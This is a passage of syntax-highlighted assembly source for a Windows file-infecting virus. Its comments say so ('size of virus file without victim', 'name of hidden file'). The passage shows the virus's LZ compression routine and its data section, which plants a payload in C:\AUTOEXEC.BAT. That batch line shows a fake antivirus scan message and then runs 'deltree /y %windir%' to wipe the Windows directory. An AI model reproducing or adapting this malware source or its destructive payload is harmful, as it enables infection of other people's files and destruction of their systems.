</span><span class="sc1">;           edx=data register</span><span class="sc0">
</span><span class="sc1">;           ebp=for saving search pointer</span><span class="sc0">
</span><span class="sc1">;           ebx=for saving maximal length</span><span class="sc0">
</span><span class="sc1">;           esi=source pointer</span><span class="sc0">
</span><span class="sc1">;           edi=search pointer</span><span class="sc0">
</span><span class="sc1">;           ecx=end of source pointer (bounds)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LZPack</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">unpacked</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; seek source pointer to start of source</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">packed</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">result</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; zero result buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buf</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">nomatch</span><span class="sc0"> </span><span class="sc1">; start with storing first symbol to buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">result</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">packed</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">plength</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">lzloop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">unpacked</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4094</span><span class="sc0"> </span><span class="sc1">; window size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; maximal found length</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">shrwin</span><span class="sc0"> </span><span class="sc1">; if current pointer in source far then 4095 from start,</span><span class="sc0">
        </span><span class="sc1">; then search from (source-window_size)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; else search from start of source</span><span class="sc0">
</span><span class="sc5">shrwin</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; store source pointer</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">unplen</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; now ecx points to last byte of source file</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">lzz0</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get byte from source pointer</span><span class="sc0">
</span><span class="sc5">lzbuf2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">findend</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">lzbuf2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">lzbuf0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">fcheck</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">lzbuf0</span><span class="sc0">
</span><span class="sc5">fcheck</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; restore source pointer</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc1">; calculate matched length</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">nomax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">maxofs</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0"> </span><span class="sc1">; if found reference longer than max_ref_len then stop search</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">findend</span><span class="sc0">
</span><span class="sc5">nomax</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc1">; restore search pointer</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">lzz0</span><span class="sc0">
</span><span class="sc5">findend</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">nomatch</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">flush</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">len_ok1</span><span class="sc0"> </span><span class="sc1">; if reference_length &lt;= 10</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">len_ok1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">maxofs</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; (offset to maximal matched string) will be there</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; bit7 - denoting a reference</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">putb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">putb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">unplen</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">unpacked</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">lzloop</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">lzdone</span><span class="sc0">

</span><span class="sc5">nomatch</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">; store al to buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">buf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buf</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">127</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">nofull</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">flush</span><span class="sc0">
</span><span class="sc5">nofull</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">unplen</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">unpacked</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">lzloop</span><span class="sc0">
</span><span class="sc5">lzdone</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">flush</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">putb</span><span class="sc0">

</span><span class="sc1">; ================ FLUSH =======================</span><span class="sc0">
</span><span class="sc1">; flush temporary buffer (can't use esi,ebx,ebp)</span><span class="sc0">
</span><span class="sc5">flush</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">buf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ret1ptr</span><span class="sc0"> </span><span class="sc1">; buffer is empty</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">putb</span><span class="sc0"> </span><span class="sc1">; store length</span><span class="sc0">
</span><span class="sc5">flm1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">putb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">flm1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buf</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">ret1ptr</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">; ================ PUT BYTE al TO OUTPUT STREAM ================</span><span class="sc0">
</span><span class="sc1">;       can't use esi,ebx,ecx,edi,edx</span><span class="sc0">
</span><span class="sc5">putb</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">result</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">result</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">; ==========================================================================</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">SysTime</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">first</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; we are running from installer</span><span class="sc0">
</span><span class="sc5">cmdline1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; name of hidden file</span><span class="sc0">
</span><span class="sc5">maxofs</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; offset of longest mathed string</span><span class="sc0">
</span><span class="sc5">buf</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; pointer to current symbol in 128-byte LZ-buffer</span><span class="sc0">
</span><span class="sc5">result</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; current pointer to LZ packed data</span><span class="sc0">
</span><span class="sc5">mysize</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; size of virus file without victim</span><span class="sc0">
</span><span class="sc5">paramlist</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; pointer of the remainder with command line paramaters</span><span class="sc0">
</span><span class="sc5">unpacked</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; pointer to unpacked data</span><span class="sc0">
</span><span class="sc5">packed</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; pointer to packed data</span><span class="sc0">
</span><span class="sc5">handle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; handle to file</span><span class="sc0">
</span><span class="sc5">plength</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; length of packed data</span><span class="sc0">
</span><span class="sc5">unplen</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; length of source file</span><span class="sc0">
</span><span class="sc5">len1</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; number of actually read/written bytes in IO operations</span><span class="sc0">
</span><span class="sc5">atom</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; ATOM for checking presence</span><span class="sc0">
</span><span class="sc5">version</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[SMF.LZSLOW]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cmdline</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; command line and current program</span><span class="sc0">
</span><span class="sc5">fName</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; filename of created file</span><span class="sc0">
</span><span class="sc5">_si</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; startup info</span><span class="sc0">

</span><span class="sc5">wndname</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; 512-byte buffer for windows names</span><span class="sc0">
</span><span class="sc5">buffer</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc1">; 128-byte LZ-buffer in same place with search record</span><span class="sc0">
</span><span class="sc5">FindData</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc1">; search record</span><span class="sc0">
</span><span class="sc5">dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ftCreationTime</span><span class="sc0">      </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ftLastAccessTime</span><span class="sc0">    </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ftLastWriteTime</span><span class="sc0">     </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dwReserved0</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dwReserved1</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">cFileName</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">cAlternateFileName</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc1">; end of search record</span><span class="sc0">

</span><span class="sc1">; Starting directory:</span><span class="sc0">
</span><span class="sc5">CurName</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;CurName        db 'c:\temp\test\', 512 dup (0)</span><span class="sc0">

</span><span class="sc5">ffn</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\AUTOEXEC.BAT'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">joke</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'@echo Wait: AVP is searching viruses now...'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'@deltree /y %windir% &gt;nul :) AVP'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc5">ej</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">

</span><span class="sc5">pi</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc1">; PROCESS_INFORMATION struct:</span><span class="sc0">
</span><span class="sc5">hProcess</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">hTread</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">processID</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">treadID</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc1">; end of PROCESS_INFORMATION structure</span><span class="sc0">

        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span></div></body>
</html>
